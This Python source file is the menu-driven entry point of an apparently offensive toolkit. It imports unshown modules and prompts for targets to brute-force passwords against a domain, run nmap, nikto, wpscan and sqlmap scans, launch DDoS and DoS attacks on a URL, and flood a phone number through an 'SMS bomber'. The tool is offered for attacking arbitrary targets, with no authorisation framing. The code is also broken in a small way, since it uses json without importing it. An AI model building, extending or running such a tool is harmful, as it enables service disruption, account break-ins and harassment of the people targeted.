import sys
from network_tools import NetworkTools
from brute_force_tool import BruteForceTool
from scanner_tools import ScannerTools
from attack_tools import AttackTools
from utility_tools import UtilityTools

def main():
    while True:
        print("Choose an option:")
        print("1. Brute Force")
        print("2. Web")
        print("3. SQL")
        print("4. DDoS Attack")
        print("5. DoS Attack")
        print("6. SMS Bomber")
        print("7. Exit")

        choice = input("Enter your choice (1, 2, 3, 4, 5, 6 or 7): ")

        if choice == '1':
            domain, username = BruteForceTool.prompt_for_input()
            wordlist_path = f'{username}_rockyou.txt'
            BruteForceTool.generate_passwords(wordlist_path)
            ip_address = NetworkTools.get_ip_address(domain)
            if not ip_address:
                print(f"{domain}: Unable to find IP address")
                sys.exit(1)
            BruteForceTool.brute_force(ip_address, username, wordlist_path)

        elif choice == '2':
            domain = input("Please enter a domain: ")
            ip_address = NetworkTools.get_ip_address(domain)
            if ip_address:
                print(f"{domain}: {ip_address}")
                domain_info = NetworkTools.get_domain_info(domain)
                server_info = NetworkTools.get_server_info(ip_address)
                print(f"Domain Info: {domain_info}")
                print(f"Server Info: {json.dumps(server_info, indent=2)}")
                UtilityTools.save_to_json(domain, domain_info, server_info)
            else:
                print(f"{domain}: Unable to find IP address")

        elif choice == '3':
            scan_choice = input("Choose a scan type: (1) nmap, (2) nikto, (3) wpscan, (4) sqlmap: ")
            if scan_choice == '1':
                domain = input("Please enter a domain: ")
                ip_address = NetworkTools.get_ip_address(domain)
                if ip_address:
                    ScannerTools.nmap_scan(ip_address)
                else:
                    print(f"{domain}: Unable to find IP address")
            elif scan_choice == '2':
                url = input("Please enter a URL to scan with nikto: ")
                ScannerTools.nikto_scan(url)
            elif scan_choice == '3':
                url = input("Please enter a URL to scan with wpscan: ")
                ScannerTools.wpscan(url)
            elif scan_choice == '4':
                url = input("Please enter a URL to scan with sqlmap: ")
                ScannerTools.sqlmap_scan(url)
            else:
                print("Invalid scan type choice.")
                sys.exit(1)

        elif choice == '4':
            url = input("Please enter a URL to attack: ")
            threads = int(input("Enter number of threads: "))
            AttackTools.ddos_attack(url, threads)

        elif choice == '5':
            url = input("Please enter a URL to attack: ")
            rate_limit = int(input("Enter rate limit in seconds: "))
            delay_range = (int(input("Enter minimum delay in seconds: ")), int(input("Enter maximum delay in seconds: ")))
            AttackTools.dos_attack(url, rate_limit, delay_range)

        elif choice == '6':
            phone_number = input("Please enter the target phone number: ")
            message = input("Enter the message to send: ")
            count = int(input("Enter the number of messages to send: "))
            UtilityTools.sms_bomber(phone_number, message, count)

        elif choice == '7':
            print("Exiting...")
            sys.exit(0)

        else:
            print("Invalid choice. Please enter 1, 2, 3, 4, 5, 6 or 7.")

if __name__ == '__main__':
    main()
